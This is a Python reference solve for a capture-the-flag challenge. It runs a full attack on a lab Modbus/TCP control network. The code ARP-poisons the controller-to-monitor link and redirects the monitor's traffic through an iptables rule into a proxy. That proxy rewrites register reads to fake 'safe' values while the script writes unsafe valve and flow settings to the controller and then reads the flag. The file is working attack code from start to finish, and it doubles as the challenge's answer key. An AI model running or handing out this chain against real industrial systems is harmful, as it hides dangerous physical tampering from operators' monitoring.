#!/usr/bin/env python3
"""
Reference solve — Blind Spot
==============================
Demonstrates the full intended solve chain:

  Step 1  ARP-poison the controller <-> monitor link (become on-path)
  Step 2  Redirect the intercepted Modbus/TCP session into a local proxy
          that forwards requests untouched but rewrites FC03 responses
          back to "safe" numbers, so the watchdog never sees the tamper
  Step 3  Write real, unsafe values directly to the controller (this is
          the attacker's own traffic — never intercepted by their own
          poisoning, since that only misdirects the controller<->monitor
          link)
  Step 4  Wait out the grace period, then read the flag registers

Requires: Linux, root, real L2 adjacency to the target bridge (this does
NOT work through a NAT'd Docker Desktop VM on macOS/Windows).

Dependencies:
    pip install -r requirements.txt
    (also needs the `iptables` binary on PATH)
"""

import socket
import struct
import subprocess
import sys
import threading
import time

from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp, srp
from pymodbus.client import ModbusTcpClient

IFACE            = "eth0"          # interface with L2 access to 10.13.37.0/24
CONTROLLER_IP    = "10.13.37.10"
MONITOR_IP       = "10.13.37.20"
MODBUS_PORT      = 502
PROXY_PORT       = 15020           # local port the intercepted session is redirected to

UNIT_ID          = 0x01
VALVE_REG        = 0
FLOW_REG         = 1

SAFE_VALVE_VALUE = 15
SAFE_FLOW_VALUE  = 220

TAMPER_VALVE     = 100
TAMPER_FLOW      = 900

GRACE_SECONDS    = 20
FLAG_REG_START   = 100
FLAG_REG_COUNT   = 29              # len("flag{the_monitor_saw_nothing}")

_poison_running = True


def banner(msg: str) -> None:
    print(f"\n{'-' * 60}")
    print(f"  {msg}")
    print("-" * 60)


def get_mac(ip: str) -> str:
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2, iface=IFACE, verbose=False,
    )
    return ans[0][1].hwsrc


def arp_poison_loop(controller_mac: str, monitor_mac: str, my_mac: str):
    """Continuously tells the controller 'I am the monitor' and the monitor
    'I am the controller', so every packet between them detours through us."""
    to_controller = (
        Ether(dst=controller_mac)
        / ARP(op=2, pdst=CONTROLLER_IP, hwdst=controller_mac, psrc=MONITOR_IP, hwsrc=my_mac)
    )
    to_monitor = (
        Ether(dst=monitor_mac)
        / ARP(op=2, pdst=MONITOR_IP, hwdst=monitor_mac, psrc=CONTROLLER_IP, hwsrc=my_mac)
    )
    while _poison_running:
        sendp(to_controller, iface=IFACE, verbose=False)
        sendp(to_monitor, iface=IFACE, verbose=False)
        time.sleep(2)


def restore_arp(controller_mac: str, monitor_mac: str):
    restore_to_controller = (
        Ether(dst=controller_mac)
        / ARP(op=2, pdst=CONTROLLER_IP, hwdst=controller_mac, psrc=MONITOR_IP, hwsrc=monitor_mac)
    )
    restore_to_monitor = (
        Ether(dst=monitor_mac)
        / ARP(op=2, pdst=MONITOR_IP, hwdst=monitor_mac, psrc=CONTROLLER_IP, hwsrc=controller_mac)
    )
    for _ in range(5):
        sendp(restore_to_controller, iface=IFACE, verbose=False)
        sendp(restore_to_monitor, iface=IFACE, verbose=False)
        time.sleep(0.2)


def enable_forwarding_and_redirect():
    # The jump box's /proc/sys is mounted read-only (Docker's default sysctl
    # hardening), so this can't be written at runtime — the compose file sets
    # net.ipv4.ip_forward=1 at container creation instead. Just confirm it.
    with open("/proc/sys/net/ipv4/ip_forward") as f:
        if f.read().strip() != "1":
            print("  [-] net.ipv4.ip_forward is not enabled on this box — "
                  "add `sysctls: [net.ipv4.ip_forward=1]` to the attacker "
                  "service in docker-compose.yml")
            sys.exit(1)
    subprocess.run([
        "iptables", "-t", "nat", "-A", "PREROUTING",
        "-p", "tcp", "-s", MONITOR_IP, "-d", CONTROLLER_IP, "--dport", str(MODBUS_PORT),
        "-j", "REDIRECT", "--to-port", str(PROXY_PORT),
    ], check=True)


def remove_redirect():
    subprocess.run([
        "iptables", "-t", "nat", "-D", "PREROUTING",
        "-p", "tcp", "-s", MONITOR_IP, "-d", CONTROLLER_IP, "--dport", str(MODBUS_PORT),
        "-j", "REDIRECT", "--to-port", str(PROXY_PORT),
    ], check=False)


def rewrite_response(data: bytes) -> bytes:
    """If this is an FC03 response covering VALVE_REG/FLOW_REG, splice in
    the safe values. Everything else (write acks, unrelated reads) passes
    through untouched."""
    if len(data) < 9:
        return data
    function_code = data[7]
    byte_count = data[8]
    if function_code == 0x03 and byte_count == 4:
        safe_payload = struct.pack(">HH", SAFE_VALVE_VALUE, SAFE_FLOW_VALUE)
        return data[:9] + safe_payload
    return data


def relay(src: socket.socket, dst: socket.socket, rewrite: bool):
    try:
        while True:
            chunk = src.recv(4096)
            if not chunk:
                break
            dst.sendall(rewrite_response(chunk) if rewrite else chunk)
    except OSError:
        pass
    finally:
        dst.close()


def handle_connection(monitor_sock: socket.socket):
    controller_sock = socket.create_connection((CONTROLLER_IP, MODBUS_PORT), timeout=5)
    t1 = threading.Thread(target=relay, args=(monitor_sock, controller_sock, False), daemon=True)
    t2 = threading.Thread(target=relay, args=(controller_sock, monitor_sock, True), daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()


def run_proxy():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", PROXY_PORT))
    server.listen(8)
    while True:
        conn, _ = server.accept()
        threading.Thread(target=handle_connection, args=(conn,), daemon=True).start()


def main():
    conf.iface = IFACE
    my_mac = get_if_hwaddr(IFACE)

    banner("Step 1 - ARP-poison the controller <-> monitor link")
    print(f"  Resolving real MAC addresses over {IFACE} ...")
    controller_mac = get_mac(CONTROLLER_IP)
    monitor_mac = get_mac(MONITOR_IP)
    print(f"  controller {CONTROLLER_IP} is at {controller_mac}")
    print(f"  monitor    {MONITOR_IP} is at {monitor_mac}")

    poison_thread = threading.Thread(
        target=arp_poison_loop, args=(controller_mac, monitor_mac, my_mac), daemon=True,
    )
    poison_thread.start()
    print("  [+] Poisoning both ARP caches every 2s")

    banner("Step 2 - Redirect the intercepted session into a rewriting proxy")
    enable_forwarding_and_redirect()
    threading.Thread(target=run_proxy, daemon=True).start()
    print(f"  [+] Monitor's traffic to the controller now detours through localhost:{PROXY_PORT}")
    print(f"      Reads are rewritten to valve={SAFE_VALVE_VALUE}%% flow={SAFE_FLOW_VALUE}L/s")
    print("      before the watchdog ever sees them.")
    time.sleep(3)   # let one clean poll cycle go through before tampering

    banner("Step 3 - Tamper with the real device directly")
    client = ModbusTcpClient(host=CONTROLLER_IP, port=MODBUS_PORT)
    if not client.connect():
        print(f"  [-] Cannot connect to {CONTROLLER_IP}:{MODBUS_PORT}")
        sys.exit(1)
    client.write_register(address=VALVE_REG, value=TAMPER_VALVE, slave=UNIT_ID)
    client.write_register(address=FLOW_REG, value=TAMPER_FLOW, slave=UNIT_ID)
    print(f"  [+] Wrote valve={TAMPER_VALVE}%% flow={TAMPER_FLOW}L/s to the real controller")

    banner(f"Step 4 - Hold for {GRACE_SECONDS}s and read the flag")
    time.sleep(GRACE_SECONDS + 3)
    rr = client.read_holding_registers(address=FLAG_REG_START, count=FLAG_REG_COUNT, slave=UNIT_ID)
    if rr.isError():
        print(f"  [-] Flag read failed (watchdog must have noticed): {rr}")
        sys.exit(1)

    flag = "".join(chr(r) for r in rr.registers if r != 0)
    print(f"\n  FLAG -> {flag}\n")

    client.close()

    global _poison_running
    _poison_running = False
    restore_arp(controller_mac, monitor_mac)
    remove_redirect()


if __name__ == "__main__":
    main()
